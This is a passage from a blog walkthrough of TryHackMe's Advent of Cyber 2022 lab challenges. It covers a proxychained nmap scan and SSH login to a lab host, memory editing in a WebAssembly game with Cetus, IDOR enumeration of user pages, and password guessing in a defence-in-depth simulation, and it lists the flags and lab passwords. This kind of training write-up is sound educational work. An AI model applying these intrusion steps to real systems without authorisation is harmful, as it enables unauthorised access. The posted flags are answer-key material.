</pre></table></code></div></div><p><strong>What ports are open on the host machine?</strong> Once we got all the proxy configured, we can start inspecting this final host we have to connect to. For that, we will use <code class="language-plaintext highlighter-rouge">nmap</code> together with the <code class="language-plaintext highlighter-rouge">proxychains</code> command we just configured:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>└─$ proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-19 17:28 CET
Nmap scan report for 172.17.0.1
Host is up (0.082s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
5432/tcp closed postgresql
</pre></table></code></div></div><p>So the answer to this question is <code class="language-plaintext highlighter-rouge">22,80</code>.</p><p><strong>What is the root flag?</strong> After we discover that the <em>ssh</em> port is open, we can try to connect to it with the credentials we got earlier, and then inspect around:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>└─$ proxychains -q ssh santa@172.17.0.1
santa@172.17.0.1's password: p4$$w0rd

root@hostname:~# ll
total 28
drwx------  4 root root 4096 Dec 19 16:30 ./
drwxr-xr-x 22 root root 4096 Sep 13 16:48 ../
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Dec 19 16:30 .cache/
drwx------  3 root root 4096 Dec 19 16:30 .gnupg/
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   38 Sep 13 17:06 root.txt
root@hostname:~# cat root.txt 
THM{47C61A0FA8738BA77308A8A600F88E4B}
</pre></table></code></div></div><p>So we see that the flag is written in <code class="language-plaintext highlighter-rouge">root.txt</code>, and it’s <code class="language-plaintext highlighter-rouge">THM{47C61A0FA8738BA77308A8A600F88E4B}</code>.</p><h1 id="day-10---youre-a-mean-one-mryeti-hack-a-game">Day 10 - You’re a mean one, Mr.Yeti (Hack a game)</h1><p>For today’s challenge we will be using <a href="https://github.com/Qwokka/Cetus">Cetus</a> to see into the memory addresses of a Web Assembly game in order to win it. I downloaded Cetus and will be solving the challenge from my own Kali Linux, but they already offer us a Kali ready to use with everything installed.</p><p>Once we open the game on the browser, we can open Cetus through the Developer Tools (on the <code class="language-plaintext highlighter-rouge">&gt;&gt;</code> icon).</p><p><img data-src="/images/adventofcyber_day10_1.png" alt="game" data-proofer-ignore></p><p>If we go talk with the blue-fox-thingy on the right, it explains to us that he is the Guard of the prison, and that he will let us go if we guess a random number between 1 and 99999999. The first time we try it, we cannot guess it for sure, but now we know the random number the Guard thought about:</p><p><img data-src="/images/adventofcyber_day10_2.png" alt="game 2" data-proofer-ignore></p><p>As seen in the picture above, we can now search for that specific number in Cetus, and we find one result. The memory is saving the values in hexadecimal, but we can use some hexadecimal to decimal converter like <a href="https://www.rapidtables.com/convert/number/hex-to-decimal.html">this one</a> to see that <code class="language-plaintext highlighter-rouge">1750bde = 24447966</code>. Now we can bookmark this address (using the little blue icon next to the result) in order to see how it changes on the <em>Bookmarks</em> tab.</p><p>If we start talking to the Guard again, we see that the Value on this address changes, meaning that a new random value has been generated. This value is the one the Guard will be thinking about, so now we can convert it to decimal using the same <a href="https://www.rapidtables.com/convert/number/hex-to-decimal.html">converter</a>, and give that as input when prompted</p><p><img data-src="/images/adventofcyber_day10_3.png" alt="game 3" data-proofer-ignore></p><p>After we guess the number and the Guard freaks out, he will open the door. Before going through the door, if we talk to the Guard again, he will tell us the flag.</p><p><strong>What is the Guard’s flag?</strong> <code class="language-plaintext highlighter-rouge">THM{5_star_Fl4gzzz}</code></p><p>If we keep moving to the bridge on the right of the map, we’ll find some snowballs on the way which will inevitably kill us before we make it through. In order to make it to the other side, it would be really useful to have more life points. To do that, we need to find the memory address which holds that information. Unlike before, though, we have no idea which value is in that position. We need a way of finding it out through changes in the game.</p><p>Luckily for us, Cetus provides us with a way of doing that. We know that if we let a few snowballs hit us (but not kill us), our life points lower. If enough snowballs hit us and we lose all the life points, then they restart to the maximum amount. We can use this piece of information to find the memory address containing those points:</p><p> 1. In case you did some searches on your own first, click <em>Restart Search</em><br />  2. Run an <em>EQ</em> search without entering any value. That will return us all the memory positions<br />  3. Quickly enter the snowballs and try to go back before dying<br />         3.1. If you died because your life points were already low, go to step 4<br />         3.2. Otherwise, select the <em>LT</em> (Lower Than) operator and perform another search (still without value). This will only select the memory addresses in which the value is lower than it was on the previous search (Which is what happened to our life points)<br />         3.3. If you are left with 3 addresses or less, go to step 5<br />         3.4. Otherwise, go to step 3<br />  4. Select the GT (Greater Than) operator and perform another search (still without value). This will only select the memory addresses in which the value is greater than it was on the previous search (since our life points just went up to their maximum value)<br />         4.1. If you are left with 3 addresses or less, go to step 5<br />         4.2. Otherwise, go to step 3<br />  5. Now that we have a low enough number of memory addresses, it’s time to get unlimited life<br />         5.1. Bookmark the addresses and go to the <em>Bookmarks</em> tab on Cetus<br />         5.2. You can observe how they change when we lose life or die<br />         5.3. Let’s select the <em>Freeze</em> checkbox next to one of the bookmarked addresses<br />         5.4. Go through the snowballs and be amazed by this magic and defeat the Yeti<br />         5.5. Talk to the Yeti again, get the flag and get out of there</p><p><strong>What is the Yeti’s flag?</strong> <code class="language-plaintext highlighter-rouge">THM{yetiyetiyetiflagflagflag}</code></p><h1 id="day-14---im-dreaming-of-secure-web-apps-web-application">Day 14 - I’m dreaming of secure web apps (Web Application)</h1><p>In today’s challenge we will go over a really common Web Application vulnerability: IDOR (Insecure Direct Object Reference). IDOR is a type of application vulnerability that allows an attacker to execute commands based on user input, usually in a URL. Let’s see how that works in a real example.</p><p>Once we start the machine and get the IP (<code class="language-plaintext highlighter-rouge">10.10.13.236</code> in my case), we can scan it for open ports:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>└─$ nmap -sV 10.10.13.236
Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-15 18:48 CET
Nmap scan report for 10.10.13.236
Host is up (0.059s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>We can see that there is an <code class="language-plaintext highlighter-rouge">http</code> service on port <code class="language-plaintext highlighter-rouge">8080</code>. We can try to access that now on our browser to see how this website looks. For that, let’s navigate to <code class="language-plaintext highlighter-rouge">http://10.10.13.236:8080</code>.</p><p>We can see a login page, quite expected since they gave us credentials already. So let’s enter user =<code class="language-plaintext highlighter-rouge">mcskidy</code> and password=<code class="language-plaintext highlighter-rouge">devtest</code>. Once inside, we can see <em>Elf McSkidy</em> information:</p><p><img data-src="/images/adventofcyber_elfmcskidy.png" alt="elf" data-proofer-ignore></p><p>Now, let’s answer some questions:</p><p><strong>What is the office number of Elf Pivot McRed?</strong> So they are asking for some information on the page… belonging to another user. How can we do that if we don’t have their credentials? Quite easy with IDOR ;)</p><p>Taking the url (<code class="language-plaintext highlighter-rouge">http://10.10.13.236:8080/users/101.html</code>), we can see that it’s loading a <code class="language-plaintext highlighter-rouge">101.html</code> page. We can then ask ourselves, is there any <code class="language-plaintext highlighter-rouge">102.html</code> page? and <code class="language-plaintext highlighter-rouge">103.html</code>? Do I have access to them? Let’s try it out.</p><p>When we change the url and request <code class="language-plaintext highlighter-rouge">http://10.10.13.236:8080/users/102.html</code>, we suddenly get access to <em>Elf Log McBlue</em>’s information! If we keep changing the file to find <em>Elf Pivot McRead</em>, we’ll find him at file <code class="language-plaintext highlighter-rouge">105.html</code>, and his office number is <code class="language-plaintext highlighter-rouge">134</code>.</p><p><strong>Not only profile pages but also stored images are vulnerable. Start with a URL of a valid profile image; what is the hidden flag?</strong> So they are already telling us that not only the url is vulnerable, but also the images. Let’s find the place where they load the profile image in the source code (we can see it when pressing <code class="language-plaintext highlighter-rouge">F12</code>). We will see the following code:</p><p><img data-src="/images/adventofcyber_codeIDOR.png" alt="src code" data-proofer-ignore></p><p>So it’s loading the profile image from <code class="language-plaintext highlighter-rouge">../images/101.png</code>. After trying again for a while, when I entered <code class="language-plaintext highlighter-rouge">../images/100.png</code>, we can see the profile picture substituted by the flag <code class="language-plaintext highlighter-rouge">THM{CLOSE_THE_DOOR}</code>.</p><h1 id="day-22---threats-are-failing-all-around-me-attack-surface-reduction">Day 22 - Threats are failing all around me (Attack Surface Reduction)</h1><p>For today’s challenge we simply need to match some Attack Surface Reductions actions to their corresponent attack vectors.</p><p><img data-src="/images/adventofcyber_ASR.png" alt="src code" data-proofer-ignore></p><p>After solving it, we get the flag: <code class="language-plaintext highlighter-rouge">THM{4TT4CK SURF4C3 R3DUC3D}</code></p><h1 id="day-23---mission-elfpossible-abominable-for-a-day--defence-in-depth">Day 23 - Mission ELFPossible: Abominable for a Day (Defence in Depth)</h1><p>In today’s challenge we are going to play as if we were the Yeti, who is trying to infiltrate Santa’s system. There will be 3 different cases, each with increasing difficulty, as more security levels will be added. Our objective in each of the cases is to get inside the perimeter, locate the vault area, and get access to it without being caught. Let’s start:</p><p><strong><em>First level</em></strong></p><p>On the first level, Santa’s security is focused on the perimeter. Given that, we can expect that there may be complete trust within the compound.</p><p>Going directly to the gate seems too risky, so we try talking to the guard. He asks us what our purpose is for the visit, and out of the possible answers we get, “Delivery for Santa’s EA” seems the one which is less prone to get more questions in return. Indeed, he does not ask anything, and if we now press on the gate we can enter and see different buildings.</p><p>We see there is a building which is Santa’s Office. There we find the vault, but it needs a password.</p><p>If we go to the Executive Assistant (EA) Office, and look at the drawer in the dest, we will find a little note with the following info: <code class="language-plaintext highlighter-rouge">Santa's Vault Password : S3cr3tV@ultPW</code></p><p><strong>Case 1: What is the password for Santa’s Vault?</strong> <code class="language-plaintext highlighter-rouge">S3cr3tV@ultPW</code></p><p><strong>Case 1: What is the Flag?</strong> Now we can go back to the vault and put the password. Once we do it, we can get the naughty or nice list and get the flag: <code class="language-plaintext highlighter-rouge">THM{EZ_fl@6!}</code></p><p><strong><em>Second level</em></strong></p><p>At this level, Santa’s security is ramped up. It has additional defense layers in place, but their main focus is prevention. We might be able to bypass them if we are patient and we play our cards right.</p><p>Same as before, we tell him we have a delivery and the security guard lets us in.</p><p><strong>Case 2: What is Santa’s favourite thing?</strong> We enter the EA office again and there is a post-it that says <code class="language-plaintext highlighter-rouge">Prepare: MilkAndCookies</code>. We assume then that Santa’s favourite thing are <code class="language-plaintext highlighter-rouge">MilkAndCookies</code>.</p><p><strong>Case 2: What is the password for Santa’s Vault?</strong> We go to Santa’s Office, and on the laptop it’s prompting us to enter a Password Hint. We write <code class="language-plaintext highlighter-rouge">MilkAndCookies</code>, and we get a text with the password for the vault. <code class="language-plaintext highlighter-rouge">3XtrR@_S3cr3tV@ultPW</code>.</p><p><strong>Case 2: What is the Flag?</strong> Once we enter the password into the vault, we get the flag: <code class="language-plaintext highlighter-rouge">THM{m0@r_5t3pS_n0w!}</code></p><p><strong><em>Third level</em></strong></p><p>At this level, Santa’s security is at the maximum! Aside from the previous case’s additional defense layers, Santa’s defenses give feedback to the security team. Our room for mistakes is very thin, and we should play our cards right the first time.</p><p>Same as before, we tell the guard we have a delivery and he lets us in. This time, though, he gives us an EA Pass, and warns us that we can only go to the EA Office.</p><p>In the EA Office we can steal Santa’s pass on the first drawer.</p><p><strong>Case 3: What is the Executive Assistant’s favourite thing?</strong> Still in the EA Office, if we look at the post-it, we see the following reminders:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Buy my favorite BanoffeePie.
Remind Santa to change his laptop password and make it harder to guess! Everyone knows his tendency to be lazy and repetitive...
</pre></table></code></div></div><p>So the answer to this question is <code class="language-plaintext highlighter-rouge">BanoffeePie</code>.</p><p>Then we try to enter the laptop in this office. And… surprise, the password is <code class="language-plaintext highlighter-rouge">BanoffeePie</code>. (I then realised there was a Password hint saying <code class="language-plaintext highlighter-rouge">My Favourite!</code>, so it was quite obvious).</p><p>And if we look in the trash we can see another note saying <code class="language-plaintext highlighter-rouge">OldPW.txt : H0tCh0coL@t3_01</code></p><p><strong>Case 3: What is Santa’s previous password?</strong> On this laptop in the EA Office, if we look at the trash we see a fie saying <code class="language-plaintext highlighter-rouge">OldPW.txt : H0tCh0coL@t3_01</code>, so the old password is <code class="language-plaintext highlighter-rouge">H0tCh0coL@t3_01</code>.</p><p><strong>Case 3: What is Santa’s current password?</strong> We got a clue before, stating that Santa has a tendency of being lazy and repetitive, which means it’s reaaaaally probable that his new password is simply <code class="language-plaintext highlighter-rouge">H0tCh0coL@t3_02</code>.</p><p><strong>Case 3: What is the 1st part of the vault’s password?</strong> Once we know Santa’s password, we can go to his Office and unlock the laptop with that password (). Inside we find a file <code class="language-plaintext highlighter-rouge">Vault (1/2).txt : N3w4nd1m</code>. So the first part of the vault’s password is <code class="language-plaintext highlighter-rouge">N3w4nd1m</code>.</p><p><strong>Case 3: What is the 2nd part of the vault’s password?</strong> As we found before in the file In the laptop on the EA Office there was also a file called <code class="language-plaintext highlighter-rouge">Vault(2/2).txt</code>. In there we find out that the 2nd part of the vault’s password is <code class="language-plaintext highlighter-rouge">Pr0v3dV@ultPW</code>.</p><p><strong>Case 3: What is the password for Santa’s Vault?</strong> If we put together the two parts of the password that we got, we get <code class="language-plaintext highlighter-rouge">N3w4nd1mPr0v3dV@ultPW</code></p><p>When we open the vault, we get the flag and Santa’s Code</p><p><strong>Case 3: What is the Flag?</strong> <code class="language-plaintext highlighter-rouge">THM{B@d_Y3t1_1s_n@u6hty}</code></p><p><strong>What is Santa’s Code?</strong> <code class="language-plaintext highlighter-rouge">2845</code></p><p><strong>Mission ELFPossible: What is the Abominable for a Day Flag?</strong> Finally, we go to Santa’s Workshop building, and we enter the Code <code class="language-plaintext highlighter-rouge">2845</code>. Then we enter and retrieve the final flag: <code class="language-plaintext highlighter-rouge">THM{D3f3n5e_1n_D3pth_1s_k00L!!}</code></p><h1 id="next-days-incoming-">Next days incoming …</h1></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>ctf</a>, <a href='/categories/try-hack-me/'>try hack me</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/walkthrough/" class="post-tag no-text-decoration" >walkthrough</a> <a href="/tags/frameworks/" class="post-tag no-text-decoration" >frameworks</a> <a href="/tags/log-analysis/" class="post-tag no-text-decoration" >log analysis</a> <a href="/tags/osint/" class="post-tag no-text-decoration" >OSINT</a> <a href="/tags/scanning/" class="post-tag no-text-decoration" >scanning</a> <a href="/tags/brute-forcing/" class="post-tag no-text-decoration" >brute-forcing</a> <a href="/tags/email-analysis/" class="post-tag no-text-decoration" >email analysis</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Try+Hack+Me+-+Advent+of+Cyber+4+%282022%29+-+ak01sito&url=https%3A%2F%2Fak01sito.github.io%2Fposts%2Fadvent-of-cyber-2022%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Try+Hack+Me+-+Advent+of+Cyber+4+%282022%29+-+ak01sito&u=https%3A%2F%2Fak01sito.github.io%2Fposts%2Fadvent-of-cyber-2022%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fak01sito.github.io%2Fposts%2Fadvent-of-cyber-2022%2F&text=Try+Hack+Me+-+Advent+of+Cyber+4+%282022%29+-+ak01sito" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/juggling-facts/">Hack The Box - Juggling Facts</a><li><a href="/posts/advent-of-cyber-2022/">Try Hack Me - Advent of Cyber 4 (2022)</a><li><a href="/posts/dont-forget-the-best-bits/">Reply Challenges - Don't Forget the Best Bits</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/aes/">aes</a> <a class="post-tag" href="/tags/bit-flipping/">bit_flipping</a> <a class="post-tag" href="/tags/brute-forcing/">brute-forcing</a> <a class="post-tag" href="/tags/cbc/">cbc</a> <a class="post-tag" href="/tags/code-review/">code review</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/email-analysis/">email analysis</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/dont-forget-the-best-bits/"><div class="card-body"> <em class="small" data-ts="1665984480" data-df="ll" > Oct 17, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reply Challenges - Don't Forget the Best Bits</h3><div class="text-muted small"><p> This post is an attempt to document what I learned during the crypto200 challenge organized by Reply Challenges last weekend. It was my first CTF and for sure not the last one! Table of Contents ...</p></div></div></a></div><div class="card"> <a href="/posts/juggling-facts/"><div class="card-body"> <em class="small" data-ts="1675661280" data-df="ll" > Feb 6, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Juggling Facts</h3><div class="text-muted small"><p> Today I was feeling inspired and decided to give a try to a HackTheBox challenge. I decided to go for the Juggling facts one. This is a Web challenge which was introduced in the HackTheBoo beginner...</p></div></div></a></div><div class="card"> <a href="/posts/android-in-the-middle/"><div class="card-body"> <em class="small" data-ts="1676006880" data-df="ll" > Feb 10, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Android-in-the-Middle</h3><div class="text-muted small"><p> I’m back at it again with another little challenge from HackTheBox. This time it’s a crypto one, called Android-in-the-Middle. To know what we have to do and how to get the flag, let’s look at the...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/dont-forget-the-best-bits/" class="btn btn-outline-primary" prompt="Older"><p>Reply Challenges - Don't Forget the Best Bits</p></a> <a href="/posts/juggling-facts/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - Juggling Facts</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Mireia</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/aes/">aes</a> <a class="post-tag" href="/tags/bit-flipping/">bit_flipping</a> <a class="post-tag" href="/tags/brute-forcing/">brute-forcing</a> <a class="post-tag" href="/tags/cbc/">cbc</a> <a class="post-tag" href="/tags/code-review/">code review</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/email-analysis/">email analysis</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
